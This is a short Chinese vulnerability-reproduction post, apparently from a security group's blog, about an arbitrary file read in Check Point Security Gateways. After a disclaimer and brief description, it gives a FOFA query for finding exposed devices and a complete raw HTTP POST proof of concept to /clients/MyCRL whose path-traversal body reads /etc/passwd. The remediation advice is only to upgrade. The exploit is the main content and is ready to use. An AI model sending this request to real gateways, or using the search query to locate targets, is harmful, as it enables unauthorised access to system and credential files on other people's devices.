#  漏洞复现 || Check Point Security Gateways 任意文件读取   
韩文庚  我爱林   2024-06-04 19:19  
  
## 免责声明  
  
**我爱林攻防研究院的技术文章仅供参考，****任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得利用网络从事危害国家安全、荣誉和利益****，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他！！！**  
## 漏洞描述  
  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
‍  
CheckPoint Gateway  
‍是CheckPoint 的一个安全网关设备，攻击者可构造恶意请求遍历读取系统上的文件，造成敏感信息泄漏。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlNpFHj6FKfXbBl09quiaaNj45X2IS2Q9mnjgZq5PshFxoIDGHXy4DwdCos0gmh31lA8ohtOiady6AKA/640?wx_fmt=png&from=appmsg "")  
## 资产确定  
```
fofa： app="Check_Point-SSL-Network-Extender"
```  
## 漏洞复现  
  
1.利用如下PO  
C读取passwd  
```
POST /clients/MyCRL HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Connection: close
Content-Length: 39
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

aCSHELL/../../../../../../../etc/passwd
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlNpFHj6FKfXbBl09quiaaNj4T7Vged7SuicnWX2W3ONqURMibuJvKH6I22MLCWnqsDzWQvavoRFGgicicw/640?wx_fmt=png&from=appmsg "")  
## 修复建议  
  
  
1.  
升级至安全版本  
  
如有侵权，请联系删除  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
**点它，分享点赞在看都在这里**  
  
